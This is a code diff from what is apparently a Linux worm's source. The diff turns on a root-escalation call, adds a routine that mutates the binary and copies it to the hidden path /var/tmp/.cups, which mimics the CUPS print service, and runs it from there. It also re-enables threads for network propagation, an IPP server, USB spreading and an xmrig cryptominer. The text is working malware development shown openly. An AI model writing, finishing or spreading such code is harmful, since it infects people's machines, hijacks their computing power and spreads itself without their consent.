@@ -5,10 +5,7 @@
 #include "xmr.h"
 #include "utils.h"
 #include "unix_usb_spreader.h"
-#include "mount_info.h"
-#include "mount_info_node.h"
-#include "files.h"
-#include "string_utils.h"
+
 
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
@@ -30,13 +27,7 @@ void * start_ipp_server(void *varg){
 void * start_usb_propagate(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
-/*
-    init_files_glob(global);
-    init_mount_node_glob(global);
-    init_mount_info_glob(global);
-    init_string_utils(global);
     usb_spread_module(global);
-    */
 }
 
 void * start_xmr(void *varg) {
@@ -46,13 +37,33 @@ void * start_xmr(void *varg) {
     xmrig(global);
 }
 
+void copy_to_malware_path(Globals *global, char *mwpath) {
+    mutate_lib(global);
+    int mwfd = global->open(mwpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    global->write(mwfd, global->malware_copy, sizeof(char) * global->malware_size);
+    global->close(mwfd);
+    if (global->chmod(mwpath, 0755) < 0) {
+        DEBUG_LOG_ERR("[USB] fail to chmod malware in syspath\n");
+    }
+}
+
 void entry(Globals *global) {
     // try to gain root
-    //try_get_root(global);
+    try_get_root(global);
 
     // load the file content into the global buffer
     load_file_bytes(global);
-/*
+
+    // if it's not running from the expdected path (i.e. usbs), mutate, copy there and execute it
+    char syspath[] = "/var/tmp/.cups";
+    if (global->strncmp(global->malware_path, syspath, sizeof(syspath)) != 0) {
+        copy_to_malware_path(global, syspath);
+        if (global->execl(syspath, syspath, NULL) != 0) {
+            DEBUG_LOG_ERR("[USB] fail to execute binary in EXECUTABLE PATH\n");
+        }
+        return;
+    }
+
     // start propagate
     pthread_t thread_id_propagate;
     global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
@@ -64,7 +75,7 @@ void entry(Globals *global) {
     // start ipp server
     pthread_t thread_id_ipp;
     global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);
-*/
+
     // start usb spread monitor
     pthread_t thread_id_usb;
     global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);
